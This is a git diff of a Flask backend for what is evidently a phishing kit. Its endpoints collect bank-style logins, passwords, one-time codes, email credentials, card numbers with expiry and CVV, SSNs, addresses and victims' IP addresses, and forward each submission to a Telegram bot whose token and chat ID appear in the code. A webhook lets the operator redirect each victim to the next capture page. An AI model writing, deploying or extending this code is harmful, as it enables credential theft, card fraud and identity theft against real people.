@@ -3,172 +3,264 @@ from flask_cors import CORS
 import os
 import uuid
 import requests
-import json
+import time
+from dotenv import load_dotenv
 
+load_dotenv()
 app = Flask(__name__)
-CORS(app)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-@app.after_request
-def after_request(response):
-    response.headers["Access-Control-Allow-Origin"] = "*"
-    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
-    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
-    return response
+BOT_TOKEN = os.getenv("8272757028:AAHhfNMwgF3jiB7eVGpeHn5ARpLr2TjhD7I")
+CHAT_ID = os.getenv("716666119")
 
-# ================= ENV =================
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+if not BOT_TOKEN or not CHAT_ID:
+    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
 
-print("BOT_TOKEN:", BOT_TOKEN)
-print("CHAT_ID:", CHAT_ID)
-
-# ================= MEMORY =================
 SESSION_STATUS = {}
+PAGES = [
+    {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
+    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
+    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
+    {"emoji": "🧾", "text": "C", "page": "c.html"},
+    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
+    {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
+    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
+]
 
-# ================= TELEGRAM =================
-def send_to_telegram(data, session_id):
+def set_webhook():
+    webhook_url = "https://b-bcknd.onrender.com/webhook"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
     try:
-        print("📤 SENDING TELEGRAM...")
-
-        if not BOT_TOKEN or not CHAT_ID:
-            print("❌ BOT_TOKEN or CHAT_ID missing")
-            return
-
-        is_otp = "OTP" in data
-        msg = "🔢 OTP VERIFICATION\n\n" if is_otp else "🔐 LOGIN\n\n"
-
-        for k, v in data.items():
-            msg += f"{k}: {v}\n"
-
-        msg += f"\nSESSION: {session_id}"
-
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
-                [{"text": "✅ APPROVE", "callback_data": f"{session_id}:approved"}]
-            ]
-        }
-
-        r = requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            data={
-                "chat_id": CHAT_ID,
-                "text": msg,
-                "reply_markup": json.dumps(keyboard)
-            }
-        )
-
-        print("📨 TELEGRAM RESPONSE:", r.text)
-
+        response = requests.get(url)
+        print("Webhook set response:", response.json())
+        return response.json()
     except Exception as e:
-        print("❌ TELEGRAM ERROR:", e)
+        print("Failed to set webhook:", str(e))
+        return {"ok": False, "error": str(e)}
 
-# ================= LOGIN =================
+def send_to_telegram(data, session_id, type_):
+    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
+    for key, value in data.items():
+        if isinstance(value, dict):
+            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
+            for subkey, subvalue in value.items():
+                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
+        else:
+            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
+    msg += f"<b>Session ID:</b> <code>{session_id}</code>"
+
+    inline_keyboard = [[
+        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
+    ] for b in PAGES]
+
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": msg,
+        "parse_mode": "HTML",
+        "reply_markup": {"inline_keyboard": inline_keyboard}
+    }
+
+    for attempt in range(3):
+        try:
+            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+            print("Telegram sent:", r.status_code, r.json())
+            return r.ok
+        except Exception as e:
+            print(f"Telegram attempt {attempt + 1} failed:", str(e))
+            time.sleep(2 ** attempt)
+    return False
+
 @app.route("/login", methods=["POST"])
 def login():
-    data = request.get_json() or {}
+    data = request.get_json()
+    if not data or "login" not in data or "password" not in data:
+        print("Login error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
 
+    login_id = data["login"]
+    password = data["password"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = "pending"
 
-    print("🆕 NEW LOGIN SESSION:", session_id)
-    print("📥 LOGIN DATA:", data)
+    SESSION_STATUS[session_id] = {"type": "login", "approved": False, "redirect_url": None}
+    print("Session created:", session_id)
 
-    send_to_telegram(data, session_id)
+    if not send_to_telegram({"login_id": login_id, "password": password, "ip": ip}, session_id, "login"):
+        print("Login error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
 
-    return jsonify({
-        "success": True,
-        "id": session_id
-    })
+    return jsonify({"success": True, "id": session_id}), 200
 
-# ================= OTP =================
-@app.route("/otp", methods=["GET", "POST"])
+@app.route("/otp", methods=["POST"])
 def otp():
-    if request.method == "GET":
-        return "OTP endpoint is alive"
+    data = request.get_json()
+    if not data or "otp" not in data:
+        print("OTP error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
 
-    data = request.get_json() or {}
-    otp_value = data.get("otp")
-    session_id = data.get("session_id")
+    otp = data["otp"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
 
-    if not otp_value:
-        return jsonify({
-            "success": False,
-            "error": "OTP is required"
-        }), 400
+    SESSION_STATUS[session_id] = {"type": "otp", "approved": False, "redirect_url": None}
+    print("OTP session created:", session_id)
 
-    if not session_id:
-        return jsonify({
-            "success": False,
-            "error": "session_id is required"
-        }), 400
+    if not send_to_telegram({"otp": otp, "ip": ip}, session_id, "otp"):
+        print("OTP error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
 
-    if session_id not in SESSION_STATUS:
-        return jsonify({
-            "success": False,
-            "error": "invalid session"
-        }), 400
+    return jsonify({"success": True, "id": session_id}), 200
 
-    SESSION_STATUS[session_id] = "pending"
+@app.route("/email", methods=["POST"])
+def email():
+    data = request.get_json()
+    if not data or "email" not in data or "password" not in data:
+        print("Email error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
 
-    print("🔢 OTP RECEIVED:", otp_value)
-    print("🔗 SESSION:", session_id)
+    email = data["email"]
+    password = data["password"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
 
-    send_to_telegram({"OTP": otp_value}, session_id)
+    SESSION_STATUS[session_id] = {"type": "email", "approved": False, "redirect_url": None}
+    print("Email session created:", session_id)
 
-    return jsonify({
-        "success": True,
-        "id": session_id
-    })
+    if not send_to_telegram({"email": email, "password": password, "ip": ip}, session_id, "email"):
+        print("Email error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
 
-# ================= STATUS =================
-@app.route("/status/<session_id>")
-def status(session_id):
-    status = SESSION_STATUS.get(session_id)
+    return jsonify({"success": True, "id": session_id}), 200
 
-    print("🔍 STATUS CHECK:", session_id, status)
+@app.route("/c", methods=["POST"])
+def c():
+    data = request.get_json()
+    if not data or "data" not in data or "card_number" not in data["data"] or "exp_date" not in data["data"] or "cvv" not in data["data"]:
+        print("C error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
 
-    if not status:
-        return jsonify({"status": "invalid"})
+    card_data = data["data"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
 
-    return jsonify({"status": status})
+    SESSION_STATUS[session_id] = {"type": "c", "approved": False, "redirect_url": None}
+    print("C session created:", session_id)
 
-# ================= WEBHOOK =================
+    if not send_to_telegram({"card_data": card_data, "ip": ip}, session_id, "c"):
+        print("C error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/personal", methods=["POST"])
+def personal():
+    data = request.get_json()
+    if not data or "full_name" not in data or "address" not in data or "city" not in data or "zip" not in data or "ssn" not in data:
+        print("Personal error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
+
+    full_name = data["full_name"]
+    address = data["address"]
+    city = data["city"]
+    zip_code = data["zip"]
+    ssn = data["ssn"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
+
+    SESSION_STATUS[session_id] = {"type": "personal", "approved": False, "redirect_url": None}
+    print("Personal session created:", session_id)
+
+    if not send_to_telegram({"full_name": full_name, "address": address, "city": city, "zip": zip_code, "ssn": ssn, "ip": ip}, session_id, "personal"):
+        print("Personal error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/login2", methods=["POST"])
+def login2():
+    data = request.get_json()
+    if not data or "login2" not in data or "password2" not in data:
+        print("Login2 error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
+
+    login2 = data["login2"]
+    password2 = data["password2"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
+
+    SESSION_STATUS[session_id] = {"type": "login2", "approved": False, "redirect_url": None}
+    print("Login2 session created:", session_id)
+
+    if not send_to_telegram({"login2": login2, "password2": password2, "ip": ip}, session_id, "login2"):
+        print("Login2 error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/thnks", methods=["POST"])
+def thnks():
+    data = request.get_json()
+    if not data or "message" not in data:
+        print("Thnks error: Missing fields")
+        return jsonify({"success": False, "error": "Missing fields"}), 400
+
+    message = data["message"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
+
+    SESSION_STATUS[session_id] = {"type": "thnks", "approved": False, "redirect_url": None}
+    print("Thnks session created:", session_id)
+
+    if not send_to_telegram({"message": message, "ip": ip}, session_id, "thnks"):
+        print("Thnks error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
 @app.route("/webhook", methods=["POST"])
 def webhook():
-    data = request.get_json()
-    print("📩 WEBHOOK HIT:", data)
+    update = request.get_json()
+    print("Webhook received:", update)
+    if not update or "callback_query" not in update:
+        print("No callback_query in update")
+        return jsonify({"status": "ignored"}), 200
 
     try:
-        if "callback_query" in data:
-            callback = data["callback_query"]
-            msg = callback["data"]
-
-            session_id, action = msg.split(":")
-
-            print("👉 CLICK:", action)
-
-            if session_id in SESSION_STATUS:
-                if action == "otp":
-                    SESSION_STATUS[session_id] = "otp"
-                elif action == "approved":
-                    SESSION_STATUS[session_id] = "approved"
-
-                print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])
-            else:
-                print("⚠️ Unknown session:", session_id)
-
+        data = update["callback_query"]["data"]
+        print("Callback data:", data)
+        session_id, action = data.split(":")
+        print(f"Session ID: {session_id}, Action: {action}")
+        if session_id in SESSION_STATUS:
+            if action in [b["page"] for b in PAGES] or action == "https://google.com":
+                SESSION_STATUS[session_id]["approved"] = True
+                SESSION_STATUS[session_id]["redirect_url"] = action
+                print("Session updated:", SESSION_STATUS[session_id])
+                return jsonify({"status": "ok"}), 200
+            print("Unknown action:", action)
+            return jsonify({"status": "unknown action"}), 404
+        else:
+            print("Unknown session:", session_id)
+            return jsonify({"status": "unknown session"}), 404
     except Exception as e:
-        print("❌ WEBHOOK ERROR:", e)
+        print("Webhook error:", str(e))
+        return jsonify({"status": "error", "error": str(e)}), 500
 
-    return jsonify({"ok": True})
+@app.route("/status/<session_id>", methods=["GET"])
+def status(session_id):
+    session = SESSION_STATUS.get(session_id)
+    if not session:
+        print("Status error: Session not found:", session_id)
+        return jsonify({"error": "Not found"}), 404
+    print("Status checked:", session_id, session)
+    if session["approved"]:
+        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
+    return jsonify({"status": "pending"}), 200
 
-# ================= ROOT =================
-@app.route("/")
+@app.route("/", methods=["GET"])
 def home():
-    return "SERVER OK"
+    return "✅ Server is live"
 
-# ================= RUN =================
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    set_webhook()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
